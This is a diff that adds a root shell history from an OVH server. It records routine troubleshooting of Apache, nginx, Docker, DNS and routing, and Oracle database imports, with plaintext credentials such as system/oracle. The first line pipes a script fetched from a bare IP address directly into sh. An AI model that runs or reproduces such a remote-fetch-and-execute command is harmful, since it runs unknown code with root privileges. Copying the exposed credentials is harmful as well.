@@ -1,0 +1,351 @@
+    1  curl -fsSL http://49.50.160.125:8080/js/gl.txt |sh
+    2  history
+    3  wpd
+    4  pwd
+    5  sudo systemctl status nginx httpd
+    6  sudo systemctl status httpd
+    7  sudo systemctl status nginx
+    8  sudo systemctl restart httpd
+    9  systemctl status httpd.service
+   10  Job for httpd.service failed because the control process exited with error code. See "systemctl status httpd.service" and "journalctl -xe" for details.
+   11  [root@vps784643 ~]# systemctl status httpd.service
+   12  ● httpd.service - The Apache HTTP Server
+   13     Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)
+   14     Active: failed (Result: exit-code) since Mon 2025-04-28 17:20:01 CEST; 31s ago
+   15       Docs: man:httpd(8)
+   16             man:apachectl(8)
+   17    Process: 22938 ExecStart=/usr/sbin/httpd $OPTIONS -DFOREGROUND (code=exited, status=1/FAILURE)
+   18   Main PID: 22938 (code=exited, status=1/FAILURE)
+   19  Apr 28 17:20:01 vps784643.ovh.net systemd[1]: Starting The Apache HTTP Server...
+   20  Apr 28 17:20:01 vps784643.ovh.net httpd[22938]: (98)Address already in use: AH00072: make_sock: could not bind to address [::]:80
+   21  Apr 28 17:20:01 vps784643.ovh.net httpd[22938]: (98)Address already in use: AH00072: make_sock: could not bind to address 0.0.0.0:80
+   22  Apr 28 17:20:01 vps784643.ovh.net httpd[22938]: no listening sockets available, shutting down
+   23  Apr 28 17:20:01 vps784643.ovh.net httpd[22938]: AH00015: Unable to open logs
+   24  Apr 28 17:20:01 vps784643.ovh.net systemd[1]: httpd.service: main process exited, code=exited, status=1/FAILURE
+   25  Apr 28 17:20:01 vps784643.ovh.net systemd[1]: Failed to start The Apache HTTP Server.
+   26  Apr 28 17:20:01 vps784643.ovh.net systemd[1]: Unit httpd.service entered failed state.
+   27  Apr 28 17:20:01 vps784643.ovh.net systemd[1]: httpd.service failed.
+   28  You have mail in /var/spool/mail/root
+   29  sudo lsof -i :80
+   30  sudo systemctl stop nginx
+   31  sudo systemctl disable nginx
+   32  sudo systemctl start ht
+   33  systemctl status httpd.service
+   34  systemctl status docker
+   35  docker -ps
+   36  docker -p
+   37  docker -s
+   38  docker -sp
+   39  docker --help
+   40  docker -ps
+   41  docker ps
+   42  docker start
+   43  systemctl start docker
+   44  systemctl ps
+   45  docker ps
+   46  docker ps -a
+   47  docker start b08e5d1d489f
+   48  docker ps
+   49  docker logs b08e5d1d489f
+   50  history
+   51  docker ps
+   52  docker exec -it b08e5d1d489f /bin/sh
+   53  docker ps -a
+   54  cd /mnt/sdb/docker-data/sauv_oracle3
+   55  docker stop app1
+   56  docker logs app1
+   57  docker start app1
+   58  docker-compose ps
+   59  docker ps
+   60  docker start oracle18
+   61  docker-compose ps
+   62  docker stop app1
+   63  docker start app1
+   64  docker ps
+   65  docker exec -it b08e5d1d489f /bin/sh
+   66  systemctl start docker
+   67  docker ps
+   68  cd /mnt/sdb/docker-data/sauv_oracle3
+   69  docker-compose ps
+   70  docker stop app1
+   71  docker-compose ps
+   72  docker-compose start
+   73  history
+   74  docker pull prestashop/prestashop:9.0.0-1.0-rc.1-classic-apache
+   75  ping google.com
+   76  curl https://registry-1.docker.io/v2/
+   77  cat /etc/resolv.conf
+   78  vi /etc/resolv.conf
+   79  cat /etc/resolv.conf
+   80  ping google.com
+   81  curl https://registry-1.docker.io/v2/
+   82  ip route
+   83  ip a
+   84  ip route add 8.8.8.8 via 51.83.32.1 dev eth0
+   85  ip route add 1.1.1.1 via 51.83.32.1 dev eth0
+   86  ping google.com
+   87  systemctl statut  NetworkManager
+   88  systemctl restart NetworkManager
+   89  systemctl status  NetworkManager
+   90  ping google.com
+   91  pwd
+   92  ls
+   93  ls data
+   94  ls data/turnserver/
+   95  ls mnt
+   96  ls mnt/sdb/
+   97  vi fix_dns_ovh.sh
+   98  lz
+   99  l
+  100  sls
+  101  ls
+  102  ll
+  103  chmod +x fix_dns_ovh.sh
+  104  ll
+  105  vi /etc/resolv.conf
+  106  ./fix_dns_ovh.sh
+  107  vi /etc/resolv.conf
+  108  ping google.com
+  109  curl https://registry-1.docker.io/v2/
+  110  systemctl status  NetworkManager
+  111  vi /etc/resolv.conf
+  112  vi fix_dns_ovh.sh
+  113  cat /etc/resolv.conf
+  114  nslookup google.com 8.8.8.8
+  115  telnet 8.8.8.8 53
+  116  systemctl stop firewalld
+  117  nslookup google.com 8.8.8.8
+  118  ping google.com
+  119  systemctl status  NetworkManager
+  120  cat /etc/resolv.conf
+  121  ping google.com
+  122  reboot
+  123  ifconfig
+  124  firewall-cmd --list-all
+  125  ip route
+  126  systemctl status network
+  127  docker ps -a
+  128  docker start 8afc75ec31f4
+  129  docker ps
+  130  docker restart 7f429d18f85d
+  131  docker ps -a
+  132  ps aux | grep dhclient
+  133  cat /var/lib/NetworkManager/dhclient-*.lease
+  134  journalctl -u NetworkManager -n 50
+  135  dhclient -v eth0
+  136  cat /var/lib/NetworkManager/dhclient-*.lease
+  137  ping google.com
+  138  systemctl status NetworkManager
+  139  systemctl status  systemd-resolved
+  140  systemctl restart systemd-resolved
+  141  history docker
+  142  history |docker
+  143  history
+  144  systemctl status docker
+  145  systemctl start docker
+  146  docker ps
+  147  docker ps -a
+  148  docker ps
+  149  curl https://registry-1.docker.io/v2/
+  150  docker pull prestashop/prestashop:9.0.0-1.0-rc.1-classic-apache
+  151  ip route add 8.8.8.8 via 51.83.32.1 dev eth0
+  152  bash
+  153  Copier
+  154  Modifier
+  155  ping 8.8.8.8
+  156  cat /etc/resolv.conf
+  157  ip route get 8.8.8.8
+  158  ip route get 1.1.1.1
+  159  nmcli device status
+  160  cp /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/sysconfig/network-scripts/ifcfg-eth0.bak
+  161  nano /etc/sysconfig/network-scripts/ifcfg-eth0
+  162  ls
+  163  vi fix_static_network_ovh.sh
+  164  chmod +x fix_static_network_ovh.sh
+  165  ls
+  166  ./fix_static_network_ovh.sh
+  167  ip route get 8.8.8.8
+  168  ip addr show dev eth0
+  169  ip addr del 178.32.41.84/32 dev eth0
+  170  ip addr del 51.255.119.47/32 dev eth0
+  171  ip addr show dev eth0
+  172  ip route get 8.8.8.8
+  173  nslookup google.com 8.8.8.8
+  174  ping google.com
+  175  vi /etc/rc.d/rc.local
+  176  docker pull prestashop/prestashop:9.0.0-1.0-rc.1-classic-apache
+  177  docker ps -a
+  178  systemctl status firewalld
+  179  firewall-cmd --list-all
+  180  Copier
+  181  Modifier
+  182  ip route add 8.8.8.8 via 51.83.32.1 dev eth0
+  183  bash
+  184  docker ps
+  185  docker run -ti --name PRESTA01 -e PS_DEV_MODE=false -e PS_INSTALL_AUTO=0 -p 8083:80 -d prestashop/prestashop:8.0
+  186  docker ps
+  187  curl http://172.17.0.2:8083
+  188  history
+  189  ip route
+  190  curl http://172.17.0.1:8083
+  191  systemctl restart httpd
+  192  docker ps
+  193  docker exec -it metadidomi_db_metadidomi_1 mysql -u root -p
+  194  docker inspect metadidomi_db_metadidomi_1 | grep MYSQL_ROOT_PASSWORD
+  195  docker exec -it metadidomi_db_metadidomi_1 mysql -u root -p
+  196  docker network create prestanet
+  197  docker network connect prestanet metadidomi_db_metadidomi_1
+  198  docker network connect prestanet PRESTA01
+  199  docker exec -it PRESTA01 bash
+  200  docker exec -it metadidomi_db_metadidomi_1 mysql -u root -p
+  201  docker exec -it PRESTA01 bash
+  202  docker pull wordpress:php8.4-fpm-alpine
+  203  history
+  204  history >>/tmp/hist20251003.txt
+  205  systemctl start docker
+  206  docker ps
+  207  docker ps -a
+  208  docker start 8afc75ec31f4
+  209  docker logs 8afc75ec31f4
+  210  docker ps -a
+  211  docker restart 7f429d18f85d
+  212  history
+  213  systemctl start docker
+  214  docker ps -a
+  215  docker ps
+  216  docker start 8afc75ec31f4
+  217  docker ps
+  218  history
+  219  docker restart 7f429d18f85d
+  220  docker ps
+  221  history 
+  222  docker ps
+  223  cd /mnt/sdb/docker-data/sauv_oracle3
+  224  ls
+  225  docker-compose ps
+  226  docker-compose logs
+  227  docker-compose ps
+  228  docker-compose app1
+  229  docker-compose stop app1
+  230  docker-compose stop oracle18
+  231  docker-compose ps
+  232  docker-compose start oracle18
+  233  docker-compose start app1
+  234  docker-compose lods app1
+  235  docker-compose logs app1
+  236  systemctl start docker
+  237  docker ps
+  238  history
+  239  cd /mnt/sdb/docker-data/sauv_oracle3
+  240  docker-compose ps
+  241  docker-compose stop app1
+  242  docker-compose ps
+  243   docker-compose start oracle18
+  244  docker-compose ps -a
+  245  docker ps -a
+  246  docker start 8afc75ec31f4
+  247  docker ps
+  248  docker-compose app1
+  249  docker-compose start app1
+  250  docker-compose ps
+  251  docker ps -a
+  252  clear
+  253  docker ps -a
+  254  docker ps
+  255  docker ps -a
+  256  systemctl restart httpd
+  257  systemctl status httpd.service
+  258  systemctl restart httpd
+  259  systemctl status httpd.service
+  260  docker ps
+  261  docker ps -a
+  262  docker start b5997e1b4830
+  263  docker ps -a
+  264  docker start aa3d9cdef745
+  265  docker ps
+  266  systemctl restart httpd
+  267  systemctl status httpd.service
+  268  docker-compose up -d --build nginx
+  269  cd /root/exregister_prod/
+  270  ls
+  271  docker-compose up -d --build nginx
+  272  systemctl restart httpd
+  273  systemctl status httpd.service
+  274  systemctl restart httpd
+  275  systemctl status httpd.service
+  276  systemctl restart httpd
+  277  systemctl status httpd.service
+  278  [root@vps784643 ~]# systemctl status httpd.service
+  279  ● httpd.service - The Apache HTTP Server
+  280     Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)
+  281     Active: failed (Result: exit-code) since Sun 2026-05-10 17:04:37 CEST; 5s ago
+  282       Docs: man:httpd(8)
+  283             man:apachectl(8)
+  284    Process: 14298 ExecStop=/bin/kill -WINCH ${MAINPID} (code=exited, status=0/SUCCESS)
+  285    Process: 30031 ExecReload=/usr/sbin/httpd $OPTIONS -k graceful (code=exited, status=0/SUCCESS)
+  286    Process: 14352 ExecStart=/usr/sbin/httpd $OPTIONS -DFOREGROUND (code=exited, status=1/FAILURE)
+  287   Main PID: 14352 (code=exited, status=1/FAILURE)
+  288  May 10 17:04:37 vps784643.ovh.net systemd[1]: Starting The Apache HTTP Server...
+  289  May 10 17:04:37 vps784643.ovh.net httpd[14352]: AH00526: Syntax error on lin...:
+  290  May 10 17:04:37 vps784643.ovh.net httpd[14352]: Redirect: invalid first argu...)
+  291  May 10 17:04:37 vps784643.ovh.net systemd[1]: httpd.service: main process ex...E
+  292  May 10 17:04:37 vps784643.ovh.net systemd[1]: Failed to start The Apache HTT....
+  293  May 10 17:04:37 vps784643.ovh.net systemd[1]: Unit httpd.service entered fai....
+  294  May 10 17:04:37 vps784643.ovh.net systemd[1]: httpd.service failed.
+  295  Hint: Some lines were ellipsized, use -l to show in full.
+  296  [root@vps784643 ~]#
+  297  systemctl status httpd.service
+  298  systemctl restart httpd
+  299  systemctl status httpd.service
+  300  grep -r "exregister.io" /etc/httpd/conf.d/
+  301  systemctl restart httpd
+  302  systemctl status httpd.service
+  303  ls -l /root/exregister_prod/frontend/landing.html
+  304  docker ps -a
+  305  docker start b08e5d1d489f
+  306  docker ps -a
+  307  docker ps 
+  308  history grep | b08e5d1d489f
+  309  docker ps
+  310  history || grep 8afc75ec31f4
+  311  history | grep 8afc75ec31f4
+  312  docker ps
+  313   docker exec -i oracle11g sqlplus -S system/oracle
+  314   docker exec -i oracle18 sqlplus -S system/oracle
+  315  docker ps -a
+  316  ip
+  317  ifconfig
+  318   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT file=/u01/app/oracle/oradata/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/u01/app/oracle/oradata/import_assurcourt.log
+  319   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT file=/u01/app/oracle/oradata/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  320   docker exec -i lsnrctl
+  321   docker exec -i oracle18 lsnrctl
+  322   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT@xepdb1 file=/u01/app/oracle/oradata/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  323  ls /u01/app/oracle/oradata/
+  324   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT@xepdb1 file=/tmp/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  325  ls /u01/app/oracle/oradata/
+  326  ls /tmp
+  327   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT@xepdb1 file=/tmp/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  328  ls /root/oracle_data18/
+  329   docker inspect  oracle18
+  330   docker volumes  oracle18
+  331   docker volume oracle18
+  332   docker volume inspect oracle18
+  333   docker volume inspect 
+  334   docker volumes 
+  335   docker volume
+  336   docker volume ls
+  337   docker volume inspect sauv_oracle3_oradata
+  338  ls /mnt/sdb/docker/volumes/sauv_oracle3_oradata/
+  339  ls /mnt/sdb/docker/volumes/sauv_oracle3_oradata/_data
+  340  ls /mnt/sdb/docker-data/sauv_oracle3/xedb1/oradata
+  341   docker inspect  oracle18
+  342  mv /tmp/ASSKAREKAMOUN_2026_05_22.dmp /mnt/sdb/docker/volumes/sauv_oracle3_oradata/
+  343  ls /mnt/sdb/docker/volumes/sauv_oracle3_oradata/
+  344   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT@xepdb1 file=/tm/opt/oracle/oradatap/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  345   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT@xepdb1 file=/opt/oracle/oradata/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  346  mv /mnt/sdb/docker/volumes/sauv_oracle3_oradata/ASSKAREKAMOUN_2026_05_22.dmp /mnt/sdb/docker/volumes/sauv_oracle3_oradata/_data
+  347  ls /mnt/sdb/docker/volumes/sauv_oracle3_oradata/
+  348  ls /mnt/sdb/docker/volumes/sauv_oracle3_oradata/_data
+  349   docker exec -i oracle18 imp ASSURCOURT/ASSURCOURT@xepdb1 file=/opt/oracle/oradata/ASSKAREKAMOUN_2026_05_22.dmp fromuser=ASSKAREKAMOUN touser=ASSURCOURT grants=y rows=y commit=y buffer=10000000 log=/tmp/import_assurcourt.log
+  350  history
+  351  history >> /tmp/tmport_data_ASSURCOURT_20260522.txt
